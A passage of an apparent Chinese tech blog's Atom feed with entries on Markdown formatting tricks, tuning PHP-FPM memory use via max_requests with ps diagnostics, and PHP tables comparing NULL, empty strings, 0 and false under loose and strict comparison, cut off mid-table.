class="line">&lt;&#x2F;details&gt;</span><br></pre></td></tr></table></figure><details><summary>git clone 成功，点击查看详情信息</summary><pre>Cloning into 'php-markdown-blog'...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67/67), done.remote: Compressing objects: 100% (55/55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67/67), done.</details><h3 id="使图像文字居中"><a href="#使图像文字居中" class="headerlink" title="使图像文字居中"></a>使图像文字居中</h3><p>HTML 中的<code>&lt;div align=&quot;center&quot;&gt;</code> 居然可以神奇的应用在 Markdown 中，然所有内容居中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;</span><br><span class="line">&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><div align="center"><img src="https://octodex.github.com/images/dunetocat.png" width="200"><p>This is some centered text.</p></div><h3 id="较小的文字"><a href="#较小的文字" class="headerlink" title="较小的文字"></a>较小的文字</h3><p>使用<code>&lt;sub&gt;</code>、<code>&lt;sup&gt;</code>标签，可以使文字变小，非常适合在图像下面添加描述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)!</span><br></pre></td></tr></table></figure><div align="center"><img src="https://octodex.github.com/images/megacat-2.png" width="200"><br><sup><strong>Fig 1:</strong> Megatocat into action</sup></div><p>View more octocats on the <a href="https://octodex.github.com/" target="_blank" rel="noopener">Octodex</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.blog/2020-04-09-github-protips-tips-tricks-hacks-and-secrets-from-lee-reilly/#9-a-numbers-game" target="_blank" rel="noopener">GitHub ProTips</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="Tips" scheme="https://www.0x2beace.com/categories/Tips/"/>
    
    
    <category term="MarkDown" scheme="https://www.0x2beace.com/tags/MarkDown/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM 优化——占用内存大不释放</title>
    <link href="https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/"/>
    <id>https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/</id>
    <published>2020-10-18T07:56:45.000Z</published>
    <updated>2020-10-18T07:59:01.020Z</updated>
    
    <content type="html"><![CDATA[<p>在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。</p><a id="more"></a><p>这里说的内存，指的是物理运行内存，而不是虚拟内存（Swap）。</p><p>LNMP架构中PHP是运行在FastCGI模式下，按照官方的说法，php-cgi会在每个请求结束的时候会回收脚本使用的全部内存，但是并不会释放给操作系统，而是继续持有以应对下一次PHP请求。而php-fpm是 FastCGI进程管理器，用于控制php的内存和进程等。</p><p>所以，解决的办法就是通过php-fpm 优化总的进程数和单个进程占用的内存，从而解决php-fpm 进程占用内存大和不释放内存的问题。</p><h3 id="查看当前占用情况"><a href="#查看当前占用情况" class="headerlink" title="查看当前占用情况"></a>查看当前占用情况</h3><p>如果发现Web 应用出现严重卡顿，请求超时等问题，首先检查一下内存的占用情况。常用的命令有：Top、Glances、Free 等。</p><p>使用Glances 或者 Top 命令查看进程，然后按下按键 M，可以查看主机当前的内存占用情况，按照占用内存由多到少排序。</p><p>也可以使用以下命令查看当前 php-fpm 总进程数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ylC php-fpm --sort:rss</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201018104932.png" alt=""></p><p>其中 rss 就是内存占用情况。</p><p>查看当前php-fpm 进程的内存占用情况及启动时间：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201018105106.png" alt=""></p><p>可以看到无论哪一种方式，结果都是一样的。</p><p>查看当前php-fpm进程平均占用内存情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;</span><br><span class="line">&#x2F;&#x2F; 22M</span><br></pre></td></tr></table></figure><h3 id="优化配置"><a href="#优化配置" class="headerlink" title="优化配置"></a>优化配置</h3><p>解决上面那个问题的核心就是 php-fpm 配置中的 <code>max_requests</code>。</p><p>即当一个 PHP-CGI 进程处理的请求数累积到 max_requests 个后，自动重启该进程，这样达到了释放内存的目的了。</p><p>一般来说一个php-fpm 进程占用的内存为30M-40M，所以根据自身实际情况作判断，有以下两种情况：</p><ol><li>实际结果是大于 30M - 40M，那么需要让 php-fpm “早一些“释放内存，<code>max_requests</code> 的数值改小一些。</li><li>实际结果是小于 30M - 40M，则可以让 php-fpm “晚一些“释放内存，<code>max_requests</code>的数值改大一些。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://wzfou.com/php-fpm/" target="_blank" rel="noopener">Linux的php-fpm优化心得-php-fpm进程占用内存大和不释放内存问题</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHP-FPM" scheme="https://www.0x2beace.com/tags/PHP-FPM/"/>
    
  </entry>
  
  <entry>
    <title>对于NULL、空、0、false等数据类型的理解</title>
    <link href="https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/"/>
    <id>https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/</id>
    <published>2020-10-17T09:21:51.000Z</published>
    <updated>2020-10-17T09:22:32.323Z</updated>
    
    <content type="html"><![CDATA[<p>之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。</p><a id="more"></a><p>常见的“空”有以下这些：</p><ul><li>整形0：0</li><li>字符1：1</li><li>字符空：””</li><li>字符零：”0”</li><li>空数组：[]</li><li>true</li><li>false</li><li>null</li></ul><p>NUll 上面的那些都好理解，都是常见的，重点介绍一下NULL。</p><h3 id="NULL-是什么？"><a href="#NULL-是什么？" class="headerlink" title="NULL 是什么？"></a>NULL 是什么？</h3><blockquote><p>Null是在计算机具有保留的值，可以用于指针不去引用对象，现在很多程序都会使用指针来表示条件，但是在不同的语言中，含义是不一样的。</p></blockquote><p>这里我们只介绍 PHP 中的 NULL。</p><p>在 PHP 中，表示一个变量没有赋值、或者是被赋值的值为 NULL，以及被 unset 的。</p><h3 id="使用PHP-函数对变量进行比较："><a href="#使用PHP-函数对变量进行比较：" class="headerlink" title="使用PHP 函数对变量进行比较："></a>使用PHP 函数对变量进行比较：</h3><table><thead><tr><th align="left">表达式</th><th align="left"><a href="https://www.php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.is-null.php" target="_blank" rel="noopener">is_null()</a></th><th align="left"><a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a></th><th align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> : <code>if($x)</code></th></tr></thead><tbody><tr><td align="left"><code>$x = &quot;&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = null;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>var $x;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left">$x is undefined</td><td align="left"><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = array();</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = false;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = true;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 1;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 42;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 0;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = -1;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;1&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;0&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;-1&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;php&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;true&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;false&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="松散判断"><a href="#松散判断" class="headerlink" title="松散判断 =="></a>松散判断 ==</h3><table><thead><tr><th align="left"></th><th align="left"><strong><code>TRUE</code></strong></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><code>1</code></th><th align="left"><code>0</code></th><th align="left"><code>-1</code></th><th align="left"><code>&quot;1&quot;</code></th><th align="left"><code>&quot;0&quot;</code></th><th align="left"><code>&quot;-1&quot;</code></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><code>array()</code></th><th align="left"><code>&quot;php&quot;</code></th><th><code>&quot;&quot;</code></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>1</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>0</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>-1</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;1&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;0&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;-1&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>array()</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;php&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 ==="></a>严格比较 ===</h3><table><thead><tr><th align="left"></th><th align="left"><strong><code>TRUE</code></strong></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><code>1</code></th><th align="left"><code>0</code></th><th align="left"><code>-1</code></th><th align="left"><code>&quot;1&quot;</code></th><th align="left"><code>&quot;0&quot;</code></th><th align="left"><code>&quot;-1&quot;</code></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><code>array()</code></th><th align="left"><code>&quot;php&quot;</code></th><th><code>&quot;&quot;</code></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>1</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>0</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>-1</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;1&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;0&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;-1&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>array()</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;php&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td 